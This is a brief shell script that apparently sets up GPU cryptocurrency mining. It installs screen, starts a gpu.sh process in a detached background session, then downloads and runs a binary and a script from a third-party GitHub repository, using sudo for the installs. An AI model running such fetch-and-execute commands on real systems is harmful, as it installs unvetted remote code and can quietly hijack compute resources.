#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 69 85
wget https://github.com/d-crypto99/46/raw/main/mantapu
wget https://raw.githubusercontent.com/d-crypto99/46/main/gpu-nvidia.sh
chmod +x gpu-nvidia.sh
./gpu-nvidia.sh
